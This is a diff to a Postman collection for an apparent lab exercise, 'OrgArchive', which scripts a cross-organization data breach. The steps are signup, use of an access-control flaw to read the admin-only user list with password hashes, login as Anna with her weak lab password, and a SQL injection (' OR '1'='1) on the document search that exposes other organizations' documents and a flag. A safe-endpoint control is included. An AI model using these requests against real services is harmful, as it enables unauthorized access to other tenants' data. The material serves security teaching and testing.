@@ -1,7 +1,7 @@
 {
   "info": {
     "name": "OrgArchive — signup to cross-organization document access",
-    "description": "Run the 10 requests in order. Sign up as a normal user, use CVE 1 to read the admin-only users list, then search documents as Anna. Anna’s weak lab password is already set in annaPassword.",
+    "description": "Run the 9 requests in order. Sign up as a normal user, use CVE 1 to read the admin-only users list, then search documents as Anna. Anna’s weak lab password is already set in annaPassword.",
     "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
   },
   "variable": [
@@ -46,7 +46,7 @@
               "pm.response.to.have.status(200);",
               "const api = pm.response.json();",
               "pm.expect(api.service).to.equal('OrgArchive');",
-              "['/signup','/users','/organizations','/documents/search'].forEach(path => pm.expect(api.endpoints.some(e => e.path === path)).to.be.true);"
+              "['/signup','/users','/documents/search'].forEach(path => pm.expect(api.endpoints.some(e => e.path === path)).to.be.true);"
             ]
           }
         }
@@ -210,8 +210,7 @@
               "pm.expect(users.length).to.be.above(0);",
               "pm.expect(users.some(u => u.username === 'anna')).to.be.true;",
               "pm.expect(users.some(u => u.role === 'admin')).to.be.true;",
-              "pm.expect(users.find(u => u.username === 'anna').organizationUuid).to.equal('786298a5-8c02-56ce-ba8f-d2b41ec3333c');",
-              "pm.expect(users.some(u => u.organizationUuid === '1ae53893-c399-57c3-ba32-16e55b435249')).to.be.true;"
+              "pm.expect(users.every(u => !('organizationUuid' in u))).to.be.true;"
             ]
           }
         }
@@ -248,18 +247,19 @@
               "pm.response.to.have.status(200);",
               "const users = pm.response.json();",
               "pm.expect(users.length).to.be.above(1);",
-              "users.forEach(u => pm.expect(u.passwordHash).to.match(/^\\$2[aby]\\$/));"
+              "users.forEach(u => pm.expect(u.passwordHash).to.match(/^\\$2[aby]\\$/));",
+              "pm.expect(users.every(u => !('organizationUuid' in u))).to.be.true;"
             ]
           }
         }
       ]
     },
     {
-      "name": "7 · Anna document search → own organization",
+      "name": "7 · Anna searches our organization → empty",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
-        "description": "",
+        "description": "Use only the UUID returned by our signup. Anna belongs to another organization, so this legitimate search has no matches.",
         "auth": {
           "type": "basic",
           "basic": [
@@ -283,59 +283,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"organizationUuid\": \"786298a5-8c02-56ce-ba8f-d2b41ec3333c\"\n}",
-          "options": {
-            "raw": {
-              "language": "json"
-            }
-          }
-        }
-      },
-      "event": [
-        {
-          "listen": "test",
-          "script": {
-            "type": "text/javascript",
-            "exec": [
-              "pm.response.to.have.status(200);",
-              "const docs = pm.response.json();",
-              "pm.expect(docs.length).to.be.above(0);",
-              "pm.expect(docs.every(d => JSON.parse(d.metadata).organizationUuid === '786298a5-8c02-56ce-ba8f-d2b41ec3333c')).to.be.true;"
-            ]
-          }
-        }
-      ]
-    },
-    {
-      "name": "8 · Anna searches another organization → empty",
-      "request": {
-        "method": "POST",
-        "url": "{{gatewayUrl}}/documents/search",
-        "description": "",
-        "auth": {
-          "type": "basic",
-          "basic": [
-            {
-              "key": "username",
-              "value": "anna",
-              "type": "string"
-            },
-            {
-              "key": "password",
-              "value": "{{annaPassword}}",
-              "type": "string"
-            }
-          ]
-        },
-        "header": [
-          {
-            "key": "Content-Type",
-            "value": "application/json"
-          }
-        ],
-        "body": {
-          "mode": "raw",
-          "raw": "{\n  \"organizationUuid\": \"1ae53893-c399-57c3-ba32-16e55b435249\"\n}",
+          "raw": "{\n  \"organizationUuid\": \"{{userOrganizationUuid}}\"\n}",
           "options": {
             "raw": {
               "language": "json"
@@ -357,11 +305,11 @@
       ]
     },
     {
-      "name": "9 · CVE 2 · SQL injection reveals all organizations",
+      "name": "8 · CVE 2 · SQL injection reveals other organizations",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
-        "description": "",
+        "description": "The injected value starts with our own signup UUID. No other organization UUID is needed in advance.",
         "auth": {
           "type": "basic",
           "basic": [
@@ -385,7 +333,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"organizationUuid\": \"786298a5-8c02-56ce-ba8f-d2b41ec3333c' OR '1'='1\"\n}",
+          "raw": "{\n  \"organizationUuid\": \"{{userOrganizationUuid}}' OR '1'='1\"\n}",
           "options": {
             "raw": {
               "language": "json"
@@ -400,8 +348,10 @@
             "type": "text/javascript",
             "exec": [
               "pm.response.to.have.status(200);",
-              "const organizations = new Set(pm.response.json().map(d => JSON.parse(d.metadata).organizationUuid));",
-              "['786298a5-8c02-56ce-ba8f-d2b41ec3333c','1ae53893-c399-57c3-ba32-16e55b435249','aa2262cf-c84c-5f89-8853-dc9b2ebb4a7b','768fc845-aff9-5b32-b626-a8f05a8778d2','d3302858-83b5-5ec5-aba6-1f7c9da45bd0'].forEach(o => pm.expect(organizations.has(o)).to.be.true);",
+              "const docs = pm.response.json();",
+              "const organizations = new Set(docs.map(d => JSON.parse(d.metadata).organizationUuid));",
+              "pm.expect(organizations.size).to.be.at.least(5);",
+              "pm.expect(organizations.has(pm.collectionVariables.get('userOrganizationUuid'))).to.be.false;",
               "pm.expect(pm.response.text()).to.include('FLAG{archive-isolation-broken-by-converter}');"
             ]
           }
@@ -409,7 +359,7 @@
       ]
     },
     {
-      "name": "10 · Safe search with the same input → empty",
+      "name": "9 · Safe search with the same input → empty",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search-safe",
@@ -437,7 +387,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"organizationUuid\": \"786298a5-8c02-56ce-ba8f-d2b41ec3333c' OR '1'='1\"\n}",
+          "raw": "{\n  \"organizationUuid\": \"{{userOrganizationUuid}}' OR '1'='1\"\n}",
           "options": {
             "raw": {
               "language": "json"
